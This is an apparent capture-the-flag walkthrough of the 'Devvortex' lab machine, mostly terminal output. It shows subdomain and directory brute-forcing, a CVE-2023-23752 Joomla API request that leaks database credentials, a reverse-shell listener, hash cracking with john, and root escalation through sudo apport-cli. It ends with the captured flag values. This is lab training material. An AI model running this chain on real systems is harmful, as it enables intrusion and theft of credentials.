1. There is two ports are open here.
->port 22 - ssh
->port 80 - http
http://devvortex.htb/ this domain was founded while running the script.
Add this into the "/etc/hosts"
-------------------------------------------------------------
2. Enumerate for the subdomain and trying directory brute forcing 
```bash
┌──(sabeshan㉿kali)-[~]
└─$ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -fs 154  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 304ms]
:: Progress: [4989/4989] :: Job [1/1] :: 195 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```
-------------------------------------------------------------------------------------------------------------
3.There directory bruteforcing, there find some directories.
```bash
┌──(sabeshan㉿kali)-[~]
└─$ dirsearch -u http://dev.devvortex.htb/                                          
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/sabeshan/reports/http_dev.devvortex.htb/__25-08-29_19-09-44.txt

Target: http://dev.devvortex.htb/

[19:09:44] Starting:                                                                                                                                                                                                                        
[19:09:47] 404 -   16B  - /php
[19:09:48] 403 -  564B  - /%2e%2e;/test                                     
[19:10:24] 404 -   16B  - /adminphp                                         
[19:10:26] 403 -  564B  - /admin/.config                                    
[19:10:52] 301 -  178B  - /administrator  ->  http://dev.devvortex.htb/administrator/
[19:10:53] 200 -   31B  - /administrator/cache/                             
[19:10:53] 403 -  564B  - /administrator/includes/                          
[19:10:53] 200 -   12KB - /administrator/                                   
[19:10:53] 301 -  178B  - /administrator/logs  ->  http://dev.devvortex.htb/administrator/logs/
[19:10:53] 200 -   31B  - /administrator/logs/
[19:10:54] 200 -   12KB - /administrator/index.php                          
[19:10:59] 403 -  564B  - /admpar/.ftppass                                  
[19:10:59] 403 -  564B  - /admrev/.ftppass                                  
[19:11:01] 301 -  178B  - /api  ->  http://dev.devvortex.htb/api/           
[19:11:02] 404 -   54B  - /api/                                             
[19:11:02] 404 -   54B  - /api/2/issue/createmeta                           
[19:11:02] 404 -   54B  - /api/2/explore/
[19:11:02] 404 -   54B  - /api/__swagger__/
[19:11:02] 404 -   54B  - /api/_swagger_/
[19:11:02] 404 -   54B  - /api/application.wadl
[19:11:02] 404 -   54B  - /api/api
[19:11:02] 404 -   54B  - /api/apidocs/swagger.json
[19:11:02] 404 -   54B  - /api/api-docs
[19:11:02] 404 -   54B  - /api/apidocs
[19:11:02] 404 -   54B  - /api/batch
[19:11:02] 404 -   54B  - /api/cask/graphql
[19:11:02] 404 -   54B  - /api/config
[19:11:02] 404 -   54B  - /api/docs
[19:11:02] 404 -   54B  - /api/jsonws
[19:11:02] 404 -   54B  - /api/docs/
[19:11:02] 404 -   54B  - /api/jsonws/invoke
[19:11:02] 404 -   54B  - /api/index.html
[19:11:02] 404 -   54B  - /api/error_log
[19:11:02] 404 -   54B  - /api/login.json
[19:11:02] 404 -   54B  - /api/package_search/v4/documentation
[19:11:02] 404 -   54B  - /api/profile
[19:11:02] 404 -   54B  - /api/snapshots
[19:11:02] 404 -   54B  - /api/proxy
[19:11:02] 404 -   54B  - /api/spec/swagger.json
[19:11:02] 404 -   54B  - /api/swagger
[19:11:02] 404 -   54B  - /api/swagger.yaml
[19:11:02] 404 -   54B  - /api/swagger-ui.html
[19:11:02] 404 -   54B  - /api/swagger.json
[19:11:03] 404 -   54B  - /api/swagger/static/index.html
[19:11:03] 404 -   54B  - /api/v1/swagger.yaml
[19:11:03] 404 -   54B  - /api/v1/swagger.json
[19:11:03] 404 -   54B  - /api/v2
[19:11:03] 404 -   54B  - /api/swagger/swagger
[19:11:03] 404 -   54B  - /api/v1
[19:11:03] 404 -   54B  - /api/v1/
[19:11:03] 404 -   54B  - /api/timelion/run
[19:11:03] 404 -   54B  - /api/swagger/index.html
[19:11:03] 404 -   54B  - /api/swagger/ui/index
[19:11:03] 404 -   54B  - /api/v2/
[19:11:03] 404 -   54B  - /api/swagger.yml
[19:11:03] 404 -   54B  - /api/v2/helpdesk/discover
[19:11:03] 404 -   54B  - /api/v2/swagger.yaml
[19:11:03] 404 -   54B  - /api/v2/swagger.json
[19:11:03] 404 -   54B  - /api/v4
[19:11:03] 404 -   54B  - /api/vendor/phpunit/phpunit/phpunit
[19:11:03] 404 -   54B  - /api/v3
[19:11:03] 404 -   54B  - /api/version
[19:11:03] 404 -   54B  - /api/whoami
[19:11:15] 403 -  564B  - /bitrix/.settings                                 
[19:11:15] 403 -  564B  - /bitrix/.settings.bak                             
[19:11:15] 403 -  564B  - /bitrix/.settings.php.bak
[19:11:19] 301 -  178B  - /cache  ->  http://dev.devvortex.htb/cache/       
[19:11:19] 200 -   31B  - /cache/
[19:11:19] 403 -    4KB - /cache/sql_error_latest.cgi                       
[19:11:25] 200 -   31B  - /cli/                                             
[19:11:29] 301 -  178B  - /components  ->  http://dev.devvortex.htb/components/
[19:11:29] 200 -   31B  - /components/                                      
[19:11:32] 200 -    0B  - /configuration.php                                
[19:11:57] 403 -  564B  - /ext/.deps                                        
[19:12:11] 200 -    7KB - /htaccess.txt                                     
[19:12:14] 200 -   31B  - /images/                                          
[19:12:14] 301 -  178B  - /images  ->  http://dev.devvortex.htb/images/     
[19:12:14] 403 -    4KB - /images/c99.php                                   
[19:12:14] 403 -    4KB - /images/Sym.php                                   
[19:12:15] 301 -  178B  - /includes  ->  http://dev.devvortex.htb/includes/ 
[19:12:15] 200 -   31B  - /includes/                                        
[19:12:26] 301 -  178B  - /language  ->  http://dev.devvortex.htb/language/ 
[19:12:26] 200 -   31B  - /layouts/                                         
[19:12:27] 403 -  564B  - /lib/flex/uploader/.actionScriptProperties        
[19:12:27] 403 -  564B  - /lib/flex/uploader/.flexProperties                
[19:12:27] 403 -  564B  - /lib/flex/uploader/.project                       
[19:12:27] 403 -  564B  - /lib/flex/varien/.project
[19:12:27] 403 -  564B  - /lib/flex/varien/.flexLibProperties
[19:12:27] 403 -  564B  - /lib/flex/varien/.actionScriptProperties
[19:12:27] 403 -  564B  - /lib/flex/uploader/.settings
[19:12:27] 403 -  564B  - /lib/flex/varien/.settings
[19:12:27] 200 -   31B  - /libraries/                                       
[19:12:27] 301 -  178B  - /libraries  ->  http://dev.devvortex.htb/libraries/
[19:12:28] 200 -   18KB - /LICENSE.txt                                      
[19:12:34] 403 -  564B  - /mailer/.env                                      
[19:12:38] 301 -  178B  - /media  ->  http://dev.devvortex.htb/media/       
[19:12:38] 200 -   31B  - /media/                                           
[19:12:44] 301 -  178B  - /modules  ->  http://dev.devvortex.htb/modules/   
[19:12:44] 200 -   31B  - /modules/                                         
[19:12:47] 404 -   16B  - /myadminphp                                       
[19:13:09] 200 -   31B  - /plugins/                                         
[19:13:09] 301 -  178B  - /plugins  ->  http://dev.devvortex.htb/plugins/   
[19:13:17] 200 -    5KB - /README.txt                                       
[19:13:20] 403 -  564B  - /resources/.arch-internal-preview.css             
[19:13:20] 403 -  564B  - /resources/sass/.sass-cache/                      
[19:13:22] 200 -  764B  - /robots.txt                                       
[19:13:26] 404 -    4KB - /secure/ConfigurePortalPages!default.jspa?view=popular
[19:13:47] 301 -  178B  - /templates  ->  http://dev.devvortex.htb/templates/
[19:13:48] 200 -   31B  - /templates/index.html                             
[19:13:48] 200 -   31B  - /templates/                                       
[19:13:48] 200 -    0B  - /templates/system/                                
[19:13:50] 301 -  178B  - /tmp  ->  http://dev.devvortex.htb/tmp/           
[19:13:51] 200 -   31B  - /tmp/                                             
[19:13:51] 403 -    4KB - /tmp/2.php                                        
[19:13:51] 403 -    4KB - /tmp/admin.php                                    
[19:13:51] 403 -    4KB - /tmp/Cgishell.pl                                  
[19:13:51] 403 -    4KB - /tmp/cgi.pl
[19:13:51] 403 -    4KB - /tmp/cpn.php
[19:13:51] 403 -    4KB - /tmp/d.php
[19:13:51] 403 -    4KB - /tmp/domaine.php                                  
[19:13:51] 403 -    4KB - /tmp/d0maine.php
[19:13:51] 403 -    4KB - /tmp/changeall.php
[19:13:51] 403 -    4KB - /tmp/domaine.pl
[19:13:51] 403 -    4KB - /tmp/dz.php
[19:13:51] 403 -    4KB - /tmp/dz1.php                                      
[19:13:51] 403 -    4KB - /tmp/index.php
[19:13:51] 403 -    4KB - /tmp/killer.php                                   
[19:13:51] 403 -    4KB - /tmp/L3b.php
[19:13:51] 403 -    4KB - /tmp/madspotshell.php
[19:13:52] 403 -    4KB - /tmp/root.php
[19:13:52] 403 -    4KB - /tmp/priv8.php                                    
[19:13:52] 403 -    4KB - /tmp/sql.php                                      
[19:13:52] 403 -    4KB - /tmp/Sym.php
[19:13:52] 403 -    4KB - /tmp/up.php                                       
[19:13:52] 403 -    4KB - /tmp/upload.php
[19:13:52] 403 -    4KB - /tmp/vaga.php
[19:13:52] 403 -    4KB - /tmp/user.php                                     
[19:13:52] 403 -    4KB - /tmp/whmcs.php                                    
[19:13:52] 403 -    4KB - /tmp/xd.php
[19:13:52] 403 -    4KB - /tmp/uploads.php
[19:13:53] 403 -  564B  - /twitter/.env                                     
[19:14:07] 200 -    3KB - /web.config.txt
```
=======================================================================================================================
4. The webpage identified the version 4.2.6 and the exploits "Exploit for CVE-2023-23752 (4.0.0 <= Joomla <= 4.2.7)."
```bash
──(sabeshan㉿kali)-[~]
└─$ curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
* Host dev.devvortex.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.242
*   Trying 10.10.11.242:80...
* Connected to dev.devvortex.htb (10.10.11.242) port 80
* using HTTP/1.x
> GET /api/index.php/v1/config/application?public=true HTTP/1.1
> Host: dev.devvortex.htb
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)
< Date: Fri, 29 Aug 2025 14:09:55 GMT
< Content-Type: application/vnd.api+json; charset=utf-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< x-frame-options: SAMEORIGIN
< referrer-policy: strict-origin-when-cross-origin
< cross-origin-opener-policy: same-origin
< X-Powered-By: JoomlaAPI/1.0
< Expires: Wed, 17 Aug 2005 00:00:00 GMT
< Last-Modified: Fri, 29 Aug 2025 14:09:55 GMT
< Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
< Pragma: no-cache
< 
{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true",
"next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20"
,"last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},
"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},
{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},
{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},
{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},
{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},
{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},
{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},
{"type":"application","id":"224","attributes"* Connection #0 to host dev.devvortex.htb left intact
:{"list_limit":20,"id":224}},
{"type":"application","id":"224","attributes":{"access":1,"id":224}},
{"type":"application","id":"224","attributes":{"debug":false,"id":224}},
{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},
{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},
{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},
{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},
{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},
{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},
{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},
{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},
{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},
{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],
"meta":{"total-pages":4}}
```
------------------------------------------------------------------------------------------------------------------------
there is credentials called lewis:P4ntherg0t1n5r3c0n##
with that credentials there is dashboard there and activate the remote shell with that.
```bash
┌──(sabeshan㉿kali)-[~]
└─$ nc -lvnp 1337         
listening on [any] 1337 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.242] 36180
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@devvortex:~/dev.devvortex.htb$ ls -la
ls -la
total 120
drwxr-xr-x 17 www-data www-data  4096 Sep 25  2023 .
drwxr-xr-x  4 root     root      4096 Oct 29  2023 ..
-rwxr-xr-x  1 www-data www-data 18092 Dec 13  2022 LICENSE.txt
-rwxr-xr-x  1 www-data www-data  4942 Dec 13  2022 README.txt
drwxr-xr-x 11 www-data www-data  4096 Dec 13  2022 administrator
drwxr-xr-x  5 www-data www-data  4096 Dec 13  2022 api
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 cache
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 cli
drwxr-xr-x 18 www-data www-data  4096 Dec 13  2022 components
-rw-r--r--  1 www-data www-data  2037 Sep 25  2023 configuration.php
-rwxr-xr-x  1 www-data www-data  6858 Dec 13  2022 htaccess.txt
drwxr-xr-x  5 www-data www-data  4096 Dec 13  2022 images
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 includes
-r-xr-x---  1 www-data www-data  1068 Dec 13  2022 index.php
drwxr-xr-x  4 www-data www-data  4096 Dec 13  2022 language
drwxr-xr-x  6 www-data www-data  4096 Dec 13  2022 layouts
drwxr-xr-x  6 www-data www-data  4096 Dec 13  2022 libraries
drwxr-xr-x 71 www-data www-data  4096 Dec 13  2022 media
drwxr-xr-x 26 www-data www-data  4096 Dec 13  2022 modules
drwxr-xr-x 25 www-data www-data  4096 Dec 13  2022 plugins
-rwxr-xr-x  1 www-data www-data   764 Dec 13  2022 robots.txt
drwxr-xr-x  4 www-data www-data  4096 Dec 13  2022 templates
drwxr-xr-x  2 www-data www-data  4096 Dec 13  2022 tmp
-rwxr-xr-x  1 www-data www-data  2974 Dec 13  2022 web.config.txt
www-data@devvortex:~/dev.devvortex.htb$ ^Z              
zsh: suspended  nc -lvnp 1337
                                                                                                                                                                                                                                            
┌──(sabeshan㉿kali)-[~]
└─$ stty raw -echo; fg                  
[1]  + continued  nc -lvnp 1337

www-data@devvortex:~/dev.devvortex.htb$ export TERM+xterm
bash: export: `TERM+xterm': not a valid identifier
www-data@devvortex:~/dev.devvortex.htb$ export TERM=xterm
www-data@devvortex:~/dev.devvortex.htb$ cat configuration.php 
<?php
class JConfig {
        public $offline = false;
        public $offline_message = 'This site is down for maintenance.<br>Please check back again soon.';
        public $display_offline_message = 1;
        public $offline_image = '';
        public $sitename = 'Development';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = 20;
        public $access = 1;
        public $debug = false;
        public $debug_lang = false;
        public $debug_lang_const = true;
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'lewis';
        public $password = 'P4ntherg0t1n5r3c0n##';
        public $db = 'joomla';
        public $dbprefix = 'sd4fg_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
        public $dbsslkey = '';
        public $dbsslcert = '';
        public $dbsslca = '';
        public $dbsslcipher = '';
        public $force_ssl = 0;
        public $live_site = '';
        public $secret = 'ZI7zLTbaGKliS9gq';
        public $gzip = false;
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $offset = 'UTC';
        public $mailonline = true;
        public $mailer = 'mail';
        public $mailfrom = 'lewis@devvortex.htb';
        public $fromname = 'Development';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = false;
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = 25;
        public $caching = 0;
        public $cache_handler = 'file';
        public $cachetime = 15;
        public $cache_platformprefix = false;
        public $MetaDesc = '';
        public $MetaAuthor = true;
        public $MetaVersion = false;
        public $robots = '';
        public $sef = true;
        public $sef_rewrite = false;
        public $sef_suffix = false;
        public $unicodeslugs = false;
        public $feed_limit = 10;
        public $feed_email = 'none';
        public $log_path = '/var/www/dev.devvortex.htb/administrator/logs';
        public $tmp_path = '/var/www/dev.devvortex.htb/tmp';
        public $lifetime = 15;
        public $session_handler = 'database';
        public $shared_session = false;
        public $session_metadata = true;
}www-data@devvortex:~/dev.devvortex.htb$ 
-------------------------------------------------------------------------------------------
5.
mysql> select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2025-08-29 14:16:01 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)

mysql>
```
--------------------------------------------------------------------------------------------
```bash
┌──(sabeshan㉿kali)-[~/HTB/devvortex]
└─$ john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:17 DONE (2025-08-29 20:09) 0.05571g/s 78.21p/s 78.21c/s 78.21C/s kelvin..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Identified the password for the logan paul.
-----------------------------------------------------------------------------------------------
```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$ sudo /usr/bin/apport-cli
No pending crash reports. Try --help for more information.
logan@devvortex:~$ sudo /usr/bin/apport-cli -v
2.20.11
logan@devvortex:~$ sudo /usr/bin/apport-cli -c
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

apport-cli: error: -c option requires 1 argument
logan@devvortex:~$ sudo /usr/bin/apport-cli --file-bug

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... 

..dpkg-query: no packages found matching xorg
...................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.5 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
root@devvortex:/home/logan# cat /root/root.txt
d4739199ea5580f38ccc11827e6e592c
root@devvortex:/home/logan# cat user.txt
cb2bc474aae045d108fb5bac0f5d8dc3
root@devvortex:/home/logan# 
```
